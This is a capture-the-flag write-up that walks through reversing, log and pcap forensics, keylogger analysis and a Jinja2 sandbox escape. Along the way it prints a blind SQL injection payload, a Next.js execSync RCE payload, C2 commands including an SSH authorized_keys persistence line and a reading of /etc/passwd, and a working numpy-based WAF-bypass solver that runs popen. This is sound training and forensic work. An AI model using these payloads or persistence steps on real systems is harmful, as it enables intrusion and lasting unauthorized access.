let key = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(passphrase));
key = new Uint8Array(key).subarray(0, 16); // First 16 bytes as AES key

// Encryption
let iv = crypto.getRandomValues(new Uint8Array(16));
let encrypted = await crypto.subtle.encrypt(
    { name: "AES-CBC", iv: iv }, 
    await crypto.subtle.importKey("raw", key, "AES-CBC", false, ["encrypt"]), 
    data
);

// Output: IV (16 bytes) + Ciphertext
```

**Exploitation**
1.  **Extract Payload**: Identify the binary as a Bun executable and extract the trailing JavaScript source code.
2.  **Deobfuscate**: Resolve the string array obfuscation to understand the logic.
3.  **Decrypt**:
    *   Read the encrypted file.
    *   Extract the IV (first 16 bytes).
    *   Derive the key: `SHA256("sulawesi")` truncated to 16 bytes.
    *   Decrypt using AES-CBC.
    *   Decompress using Zstd (as Bun uses `bun.zstdCompress` before encryption).

**Solution**
Run the solve script:
1.  Reads `flag.txt.bunakencrypted`.
2.  Base64 decodes it.
3.  Decrypts with key `sha256("sulawesi")[:16]` and extracted IV.
4.  Decompresses the result.

```python
import base64
import hashlib
import zstandard as zstd
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# 1. Read encrypted file content
with open("flag.txt.bunakencrypted", "r") as f:
    enc_data_b64 = f.read().strip()

# 2. Base64 decode
enc_data = base64.b64decode(enc_data_b64)

# 3. Extract IV and Ciphertext
iv = enc_data[:16]
ciphertext = enc_data[16:]

print(f"IV: {iv.hex()}")

# 4. Derive key: First 16 bytes of SHA256("sulawesi")
key_source = b"sulawesi"
key_hash = hashlib.sha256(key_source).digest()
key = key_hash[:16]

print(f"Key: {key.hex()}")

# 5. Decrypt AES-CBC
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()
decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()

# 6. Decompress Zstd
dctx = zstd.ZstdDecompressor()
try:
    flag_bytes = dctx.decompress(decrypted_padded)
    print(f"Decrypted Flag: {flag_bytes.decode('utf-8')}")
except Exception as e:
    print(f"Decompression failed: {e}")
```

**Flag**
`C2C{BUN_AwKward_ENcryption_compression_obfuscation}`

---

---

### welcome (100 pts)

**Challenge Description**
A welcome message for the CTF.

**Flag**
`C2C{welcome_to_c2c}`

---

## Forensics

### Log (100 pts)

**Challenge Description**
We are given Apache web server logs (`access.log` and `error.log`) from a compromised WordPress site. The goal is to analyze the logs, reconstruct the attack, and answer specific questions about the incident (attacker IP, vulnerability, extracted data).

**Investigation**

**1. Identifying Actors**
We look for high volumes of requests or error codes to find the attacker.
```bash
$ awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -n 5
```
**Result**: `219.75.27.16` is the most active non-internal IP.

**2. Attack Reconstruction**
**Scanning**: Looking for common scanner behavior (Dirbuster/Nmap) or probing known endpoints.
```bash
$ grep "wp-login.php" access.log | grep "219.75.27.16"
```

**Exploitation**: Searching for SQL injection keywords like `UNION`, `SELECT`, `SLEEP` in the requests.
```bash
$ grep -E "UNION|SELECT|SLEEP" access.log
```
The logs show many requests to `/wp-json/layart/v1/fonts?family=`. The payloads confirm a **Time-based Blind SQL Injection**.

`error.log` confirms the target table `wp_easy-quotes-files` in the error message, identifying the **Easy Quotes** plugin (CVE-2025-26943).

**3. Data Exfiltration Analysis**
The attacker used `sqlmap`. We can grep for the successful character inferences. In Blind SQLi, boolean valid responses (or valid time delays) verify a character.
We see payloads checking for specific ASCII values using `!=`.

*Example Payload:*
`...IF(ORD(MID(...,8,1))!=97,0,1)...`

By collecting all the hex/ascii values confirmed by the injection, we reconstructed the dumped data:
1.  **Email**: `admin@daffainfo.com`
2.  **Hash**: `$wp$2y$10$vMTERqJh2IlhS.NZthNpRu/VWyhLWc0ZmTgbzIUcWxwNwXze44SqW`

**4. Post-Exploitation**
We check for successful logins (HTTP 302 redirect after POST to login).
```bash
$ grep "POST /wp-login.php" access.log | grep "302"
```
The attacker logged in at `13:12:49` and created a post "hacked-lolll".

**Findings**
*   **Attacker IP**: `219.75.27.16`
*   **Vulnerability**: SQL Injection in Easy Quotes Plugin (CVE-2025-26943)
*   **Compromised Account**: `admin@daffainfo.com`

```python
from pwn import *

answers = ["182.8.97.244", "219.75.27.16", "5", "Easy Quotes","CVE-2025-26943", "sqlmap/1.10.1.21", "admin@daffainfo.com", "$wp$2y$10$vMTERqJh2IlhS.NZthNpRu/VWyhLWc0ZmTgbzIUcWxwNwXze44SqW", "11/01/2026 13:12:49", ""]
HOST = 'challenges.1pc.tf'
PORT = 33029

p = remote(HOST, PORT)
print(p.recvuntil(b"Your Answer: ").decode())

for answer in answers:
    try:
        p.sendline(answer.encode())
        print(p.recvuntil(b"Your Answer: ").decode())
    except EOFError:
        print(p.recvall().decode())
        break
```

**Flag**
`C2C{7H15_15_V3rY_345Y_3f968f28ffa4}`

---

### Tattletale (100 pts)

**Challenge Description**
A forensics challenge involving a Linux keylogger. We are provided with a PyInstaller-packed executable (`serizawa`), a captured data file (`cron.aseng`), and an encrypted file (`whatisthis.enc`).

**Investigation**

**1. Malware Analysis (`serizawa`)**
First, we analyze the binary type.
```bash
$ file serizawa
serizawa: ELF 64-bit LSB executable...
```
It appears to be a PyInstaller packed binary. We extract it:
```bash
$ python3 pyinstxtractor.py serizawa
```
This creates `serizawa_extracted`. We locate the main logic script (usually sharing the name of the binary) and decompile it:
```bash
$ uncompyle6 serizawa_extracted/serizawa.pyc > serizawa.py
```
**Analysis**: The script reads `/dev/input/event0` (keyboard) and writes structs of `QQHHi` format (timestamp, type, code, value) to `/opt/cron.aseng`.

**2. Log Analysis (`cron.aseng`)**
To understand what was typed, we wrote a script to parse the binary event data.

```python
# parsing cron.aseng
import struct
events = open("cron.aseng", "rb").read()
# unpack in chunks of 24 bytes...
```
**Reconstructed Keystrokes**:
The attacker/user performed the following commands:
1.  `ls -la`
2.  `env > whatisthis`
3.  `od whatisthis > whatisthis.baboi`
4.  `openssl enc -aes-256-cbc -salt -in whatisthis.baboi -out whatisthis.enc -pass pass:4_g00d_fr13nD_in_n33D -pbkdf2`
5.  `rm whatisthis whatisthis.baboi`

**3. Decryption**
We have the encrypted file `whatisthis.enc` and the password `4_g00d_fr13nD_in_n33D`. We verify the command used above used `-pbkdf2`.

```bash
$ openssl enc -d -aes-256-cbc -in whatisthis.enc -out decrypted.octal -pass pass:4_g00d_fr13nD_in_n33D -pbkdf2
```
This decrypts to an **octal dump** (produced by `od`). We need to reverse the `od` format to get the original text.

```bash
# Convert octal dump back to binary/text
# (Custom script or text processing required)
```

The resulting text contains the environment variables. The following script (`d.py`) was used to reconstruct the keystrokes:

```python
import struct

FILE = "cron.aseng"
FORMAT = "QQHHi"
EVENT_SIZE = struct.calcsize(FORMAT)

KEYMAP = {
    1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0", 12: "-", 13: "=",
    14: "BACKSPACE", 15: "TAB", 16: "q", 17: "w", 18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p",
    26: "[", 27: "]", 28: "ENTER", 29: "LEFTCTRL", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k", 38: "l",
    39: ";", 40: "'", 41: "`", 42: "LEFTSHIFT", 43: "\\", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ",", 52: ".", 53: "/", 54: "RIGHTSHIFT", 56: "LEFTALT", 57: "SPACE", 58: "CAPSLOCK",
    87: "F11", 88: "F12",
}
SHIFT_MAP = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
    "-": "_", "=": "+", "[": "{", "]": "}", "\\": "|", ";": ":", "'": "\"", "`": "~", ",": "<", ".": ">", "/": "?"
}
decoded = []
shift_pressed = False
caps_lock = False

with open(FILE, "rb") as f:
    while True:
        data = f.read(EVENT_SIZE)
        if not data: break
        tv_sec, tv_usec, ev_type, code, value = struct.unpack(FORMAT, data)
        if ev_type == 1:
            if code in (42, 54):
                shift_pressed = (value == 1 or value == 2)
                continue
            if code == 58 and value == 1:
                caps_lock = not caps_lock
                continue
            if value in (1, 2):
                key = KEYMAP.get(code, "")
                if key == "BACKSPACE":
                    if decoded: decoded.pop()
                elif key == "SPACE": decoded.append(" ")
                elif key == "ENTER": decoded.append("\n")
                elif key == "TAB": decoded.append("\t")
                elif len(key) == 1:
                    if key.isalpha():
                        if shift_pressed ^ caps_lock: decoded.append(key.upper())
                        else: decoded.append(key.lower())
                    else:
                        if shift_pressed and key in SHIFT_MAP: decoded.append(SHIFT_MAP[key])
                        else: decoded.append(key)
                elif key == "c" and "LEFTCTRL" in decoded[-5:]: 
                     decoded.append("^C")
print("".join(decoded))
```
```

The resulting text contains the environment variables.

**Findings**
*   **Malware Type**: Keylogger
*   **Target**: Linux Input Subsystem
*   **Recovered Password**: `4_g00d_fr13nD_in_n33D`

**Flag**
`C2C{it_is_just_4_very_s1mpl3_l1nuX_k3ylogger_xixixi_haiyaaaaa_ez}`

---

### React (101 pts)

**Challenge Description**
Analyzing a network packet capture (`network.pcap`) to investigate an intrusion. The attacker exploits a Next.js application, establishes C2 communication using TrevorC2, and persists via SSH keys.

**Investigation**

**1. Traffic Analysis**
We start by identifying the communicating hosts using `tshark`.

```bash
$ tshark -r network.pcap -q -z conv,ip
```
**Findings:**
*   **Attacker**: `192.168.56.104` (High volume of outgoing SYN packets)
*   **Victim**: `192.168.56.103`

To confirm the scan type (SYN scan):
```bash
$ tshark -r network.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0 && ip.src==192.168.56.104" | head
```

**2. Exploitation (CVE-2025-55182)**
We filter for HTTP traffic to port 3000 to see the exploit attempts.

```bash
$ tshark -r network.pcap -Y "http.request.method == POST && tcp.port == 3000" -T fields -e http.file_data
```

The payload reveals a Next.js Server Action exploit:
```json
{"then": "$1:__proto__:then", ... "_prefix": "var res=process.mainModule.require('child_process').execSync('echo 123')..."}
```

To see the commands executed by the attacker, we look for the `x-action-redirect` header in the responses:
```bash
$ tshark -r network.pcap -Y "http.response" -T fields -e http.header | grep "x-action-redirect"
```
*   `whoami` -> `daffainfo`
*   `curl` -> Downloaded persistence agent

**3. C2 Analysis (TrevorC2)**
Traffic on port 4433 appears to be the C2 channel. The agent `a.py` was downloaded via HTTPS.

**Step 3a: Decrypt TLS**
The server certificate uses a weak 1024-bit RSA key. We extract the certificate:
```bash
$ tshark -r network.pcap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate > cert.hex
```
Using `openssl` or python to extract the modulus, we find it has close primes. We factor it (using RsaCtfTool or a script) to get `private_key.pem`.

Then we decrypt the pcap:
```bash
$ tshark -r network.pcap -o "tls.keys_list:192.168.56.104,4433,http,private_key.pem" -Y "http" -w decrypted.pcap
```

**Step 3b: Deobfuscate Agent**
We extract `a.py` from the decrypted traffic. It uses 32 layers of `zlib` + `base64` + `reverse`.
```python
# Solver snippet to deobfuscate
import base64, zlib
data = open("a.py").read()
# ... loop 32 times ...
# final_code = ...
```
**Result:** Found C2 Cipher Key: `aa34042ac9c17b459b93c0d49c7124ea`.

**4. Decrypting C2 Commands**
The C2 hides commands in HTML comments (`<!-- oldcss=... -->`). We parse and decrypt them using the key.

```bash
# Example logic to extract and decrypt
$ python3 decrypt_trevor.py decrypted.pcap aa34042ac9c17b459b93c0d49c7124ea
```

**Decrypted Actions:**
1.  `cat /etc/passwd`
2.  `echo 'ssh-ed25519 AAAAC3...' >> /home/daffainfo/.ssh/authorized_keys` (Persistence)

**Findings**
*   **Attacker IP**: `192.168.56.104`
*   **Malware**: TrevorC2
*   **Persistence**: SSH Authorized Keys
*   **Vulnerability**: Next.js Prototype Pollution RCE

```python
from pwn import *

answers = ["192.168.56.104", "192.168.56.103","nmap", "CVE-2025-55182", "echo 123", "TrevorC2", "aa34042ac9c17b459b93c0d49c7124ea", "/etc/passwd", "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4L46b5SCsXlizakO+iXIr2pjQ48dryUiX1tCGbzEUZ kali@kali' > /home/daffainfo/.ssh/authorized_keys", "T1098.004"]
HOST = 'challenges.1pc.tf'
PORT = 22525
p = remote(HOST, PORT)
print(p.recvuntil(b"Your Answer: ").decode())

for answer in answers:
    try:
        p.sendline(answer.encode())
        print(p.recvuntil(b"Your Answer: ").decode())
    except EOFError:
        print(p.recvall().decode())
        break
```

**Flag**
`C2C{r34C725h3Ll_f0r_7H3_W1n_8995bba8e58d}`

---

## Misc

### JinJail (100 pts)

**Challenge Description**
A Python web app using Jinja2 `SandboxedEnvironment`. It accepts a template string but enforces a strict WAF. The goal is to bypass the WAF and execute arbitrary code to read the flag.

**Vulnerability**
The application explicitly exposes the `numpy` library to the Jinja2 environment. While the WAF blocks common keywords like `import`, `eval`, and `os`, it allows `numpy`.
Crucially, the WAF allows `~` (bitwise NOT), which in Jinja2 acts as a string concatenation operator. Typically forbidden characters can be found in the string representations of `numpy` objects.

**Vulnerable Code**

**App Configuration (`app.py`):**
```python
env = SandboxedEnvironment()
# VULNERABLE: numpy is exposed to the sandbox
env.globals["numpy"] = numpy

def waf(content):
    # ...
    # Blocklist
    blocklist = ['fromfile', 'savetxt', 'load', 'array', 'packbits', 'ctypes', 'eval', 'exec', 'breakpoint', 'input', '+', '-', '/', '\\', '|', '"', "'"]
    # ...
```

**Exploitation**
1.  **Bypass WAF**: Use `numpy` objects to generate forbidden strings.
    *   `numpy.fix` str representation contains `.`
    *   `numpy.typing` str representation contains characters.
    *   `~` concatenates them.
2.  **Construct Payload**:
    *   Build a string: `numpy.f2py.os.popen('cat flag.txt').read()`.
    *   We need `.` and other characters that are blocked or limited.
    *   We can use `dict(help=1)` or other objects to get characters.
    *   Example construction: `{% set x = numpy.fix ~ numpy.typing ~ dict(help=1) %}`.
3.  **Execute**:
    *   Use slicing `x[i]` to pick characters from the constructed string.
    *   Dynamically assemble the payload string.
    *   Render it.

**Solution**
1.  Construct a reference string containing needed characters using `numpy` objects.
2.  Use slicing to extract characters and build the payload string `numpy.f2py.os.popen("cat flag.txt").read()`.
3.  Execute the payload via `{{ ... }}`.

```python
# pwntools solver
from pwn import *

HOST = 'challenges.1pc.tf'
PORT = 37144

p = remote(HOST, PORT)
p.recvuntil(b'>>> ')
content = b"{%set x= numpy.fix~numpy.typing~dict(help=1)%}{{x}}"
p.sendline(content)
result = p.recvline().decode()
# result contains string representation where we find characters
p = remote(HOST, PORT)
p.recvuntil(b'>>> ')
# Construct payload using indices from the result string
payload = f"x[{result.index('/')}]~x[{result.index('fix ')}:{result.index('fix ')+4}]~x[{result.index('help')}:{result.index('help')+4}]"

# numpy.f2py.os.popen(...).read()
content = b"{%set x= numpy.fix~numpy.typing~dict(help=1)%}{{numpy.f2py.os.popen("+payload.encode()+b").read()}}"
p.sendline(content)
print(p.recvline().decode())
```

**Flag**
`C2C{damnnn_i_love_numpy_6447e4b64e5e}`